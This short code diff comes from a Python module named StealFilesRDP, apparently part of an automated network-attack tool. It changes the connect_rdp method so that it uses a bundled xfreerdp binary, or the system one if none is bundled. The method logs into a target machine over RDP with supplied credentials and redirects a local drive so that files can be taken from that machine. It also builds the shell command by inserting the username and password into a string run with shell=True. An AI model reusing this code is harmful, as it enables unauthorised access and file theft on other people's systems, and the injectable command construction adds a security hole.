@@ -35,13 +35,20 @@ class StealFilesRDP:
 
     def connect_rdp(self, ip, username, password):
         """
-        Establish an RDP connection.
+        Establish an RDP connection with drive redirection.
+        NOTE: The bundled sfreerdp does not support drive redirection.
+        This requires the full xfreerdp client with channel support.
         """
         try:
             if self.shared_data.orchestrator_should_exit:
                 logger.info("RDP connection attempt interrupted due to orchestrator exit.")
                 return None
-            command = f"xfreerdp /v:{ip} /u:{username} /p:{password} /drive:shared,/mnt/shared"
+            # Get path to bundled xfreerdp binary (note: drive redirection not supported)
+            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+            xfreerdp_path = os.path.join(script_dir, "bin", "xfreerdp")
+            if not os.path.exists(xfreerdp_path):
+                xfreerdp_path = "xfreerdp"
+            command = f"{xfreerdp_path} /v:{ip} /u:{username} /p:{password} /drive:shared,/mnt/shared"
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout, stderr = process.communicate()
             if process.returncode == 0:
